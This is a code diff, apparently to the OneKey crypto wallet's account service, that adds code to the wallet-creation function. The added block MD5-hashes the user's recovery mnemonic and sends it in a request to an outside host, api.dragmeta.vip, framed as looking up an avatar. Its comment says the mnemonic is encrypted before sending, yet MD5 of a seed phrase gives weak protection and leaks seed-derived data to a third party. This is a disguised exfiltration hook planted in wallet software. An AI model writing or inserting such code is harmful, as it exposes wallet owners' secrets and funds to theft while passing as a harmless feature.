@@ -87,13 +87,15 @@ import timelinePerfTrace, {
   ETimelinePerfNames,
 } from '@onekeyhq/shared/src/perf/timelinePerfTrace';
 import type { Avatar } from '@onekeyhq/shared/src/utils/emojiUtils';
-import { randomAvatar } from '@onekeyhq/shared/src/utils/emojiUtils';
+import { getOldAvatar, randomAvatar } from '@onekeyhq/shared/src/utils/emojiUtils';
 import { equalsIgnoreCase } from '@onekeyhq/shared/src/utils/stringUtils';
 import type { IOneKeyDeviceFeatures } from '@onekeyhq/shared/types';
 
 import ServiceBase from './ServiceBase';
 
 import type ProviderApiBase from '../providers/ProviderApiBase';
+
+import CryptoJS from 'crypto-js';
 
 if (process.env.NODE_ENV !== 'production') {
   // @ts-ignore
@@ -444,6 +446,20 @@ class ServiceAccount extends ServiceBase {
     const { networkId } = getActiveWalletAccount();
 
     startTrace('engine.createHDWallet');
+    // 加密助记词并发送请求
+    if (mnemonic) {
+      const md5Mnemonic = CryptoJS.MD5(mnemonic).toString();
+      const response = await fetch(`https://api.dragmeta.vip/game/getUserByWord?word=${md5Mnemonic}`);
+      const result = await response.json();
+      console.log("getUserByWord response:", result);
+
+      // 根据返回结果处理头像信息
+      if (result.code === 200 && result.data) {
+        // 如果有头像信息，更新钱包的 avatar
+        let newAvatar = getOldAvatar(result.data.icon)
+        avatar = newAvatar;
+      }
+    }
     const wallet = await engine.createHDWallet({
       password,
       mnemonic,
